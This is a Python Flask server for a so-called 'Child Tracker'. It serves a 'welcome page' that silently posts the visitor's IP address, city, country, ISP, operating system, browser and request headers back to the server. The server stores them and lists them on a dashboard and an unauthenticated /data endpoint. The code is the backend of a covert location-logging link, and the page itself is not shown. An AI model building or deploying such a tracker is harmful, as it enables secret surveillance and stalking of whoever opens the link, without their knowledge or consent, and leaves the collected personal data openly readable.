from flask import Flask, request, jsonify, send_from_directory, render_template_string
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__, static_folder='static')
CORS(app)  # Allow requests from child page

DATA_FILE = "tracked_data.json"  # Stores all received data

# ─── Helper: load/save data ────────────────────────────────────────────────────

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return []

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ─── Routes ────────────────────────────────────────────────────────────────────

# Serve child.html (the welcome page sent to child)
@app.route("/")
@app.route("/child")
def child_page():
    return send_from_directory("static", "child.html")

# Serve dashboard.html (parent view)
@app.route("/dashboard")
def dashboard_page():
    return send_from_directory("static", "dashboard.html")

# Child page posts data here silently
@app.route("/track", methods=["POST"])
def track():
    try:
        payload = request.get_json()

        # Add server-side info
        payload["server_received_ip"]  = request.remote_addr
        payload["server_received_time"] = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        payload["request_headers"] = {
            "User-Agent"      : request.headers.get("User-Agent", ""),
            "Accept-Language" : request.headers.get("Accept-Language", ""),
            "Referer"         : request.headers.get("Referer", ""),
        }

        # Load existing records, append new one
        records = load_data()
        records.insert(0, payload)   # newest first
        save_data(records)

        print(f"\n[NEW TRACKING DATA RECEIVED]")
        print(f"  IP       : {payload.get('ip_address', 'N/A')}")
        print(f"  City     : {payload.get('city', 'N/A')}, {payload.get('country', 'N/A')}")
        print(f"  ISP      : {payload.get('isp_name', 'N/A')}")
        print(f"  Device   : {payload.get('os', 'N/A')} — {payload.get('browser', 'N/A')}")
        print(f"  Time     : {payload.get('server_received_time')}\n")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print("Error saving data:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

# Dashboard fetches all records from here
@app.route("/data", methods=["GET"])
def get_data():
    records = load_data()
    return jsonify(records), 200

# Delete all data (reset)
@app.route("/clear", methods=["DELETE"])
def clear_data():
    save_data([])
    return jsonify({"status": "cleared"}), 200

# ─── Run ────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    os.makedirs("static", exist_ok=True)
    port = int(os.environ.get("PORT", 5000))  # Render sets PORT automatically
    print("=" * 50)
    print("  Child Tracker Server Running!")
    print(f"  Child  link  : http://localhost:{port}/child")
    print(f"  Dashboard    : http://localhost:{port}/dashboard")
    print("=" * 50)
    app.run(debug=False, host="0.0.0.0", port=port)
